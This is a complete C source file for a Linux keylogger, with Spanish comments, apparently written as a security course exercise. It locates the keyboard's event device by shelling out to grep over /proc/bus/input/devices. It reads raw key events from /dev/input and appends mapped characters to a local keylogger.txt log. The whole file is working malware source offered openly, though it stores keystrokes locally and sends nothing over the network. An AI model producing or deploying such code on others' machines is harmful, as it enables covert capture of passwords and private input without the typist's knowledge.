#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/lili/Desktop/Seguridad/programas/keylogger.txt"

char *getEvent();
char mapKeyCodeToChar(int code);

int main(){
    struct input_event ev;
    // ruta al directorio de inputs
    static char path_keyboard[20] = "/dev/input/";
    // concatenar variable keyboard
    strcat(path_keyboard, getEvent());
    // eliminar último caracter (breakline)
    path_keyboard[strlen(path_keyboard)-1] = 0;
    // Inicializar errno a 0 antes de llamar a open
    errno = 0;
    // leer ruta a input
    int device_keyboard = open(path_keyboard, O_RDONLY);
    // imprimir error si open falló
    if (device_keyboard < 0) {
        printf("Error: %d\n", errno);
        return 1; // Terminar si no se puede abrir el dispositivo
    }
 // abrir fichero de logs
    FILE *fp = fopen(LOGFILEPATH, "a");
    if (!fp) {
        printf("Error al abrir el archivo de log: %s\n", strerror(errno));
        close(device_keyboard);
        return 1;
    }
    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) {
            char c = mapKeyCodeToChar(ev.code);
            if (c) {
                fputc(c, fp);   // Escribir el carácter en el archivo de log
                fflush(fp);      
            }
        }
    }
    fclose(fp);
    close(device_keyboard);
    return 0;
}
char *getEvent(){
    // leer el fichero devices y extraer el input que se refiera al teclado
    char *command = (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    // obtener la cadena de texto del evento correspondiente al teclado
    fgets(event, 8, pipe);
    pclose(pipe);
    // retornar el evento
    return event;
}
char mapKeyCodeToChar(int code) {
    // Mapeo teclas
    switch(code) {
        case 2: return '1';
        case 3: return '2';
        case 4: return '3';
        case 5: return '4';
        case 6: return '5';
        case 7: return '6';
        case 8: return '7';
        case 9: return '8';
        case 10: return '9';
        case 11: return '0';
        case 16: return 'q';
        case 17: return 'w';
        case 18: return 'e';
        case 19: return 'r';
        case 20: return 't';
        case 21: return 'y';
        case 22: return 'u';
        case 23: return 'i';
        case 24: return 'o';
        case 25: return 'p';
        case 30: return 'a';
        case 31: return 's';
        case 32: return 'd';
        case 33: return 'f';
        case 34: return 'g';
        case 35: return 'h';
        case 36: return 'j';
 	case 37: return 'k';
        case 38: return 'l';
        case 44: return 'z';
        case 45: return 'x';
        case 46: return 'c';
        case 47: return 'v';
        case 48: return 'b';
        case 49: return 'n';
        case 50: return 'm';
        case 28: return '\n'; // Enter
        case 57: return ' ';  // espacio
        default: return 0;    // Teclas no mapeados retornan 0
    }
}




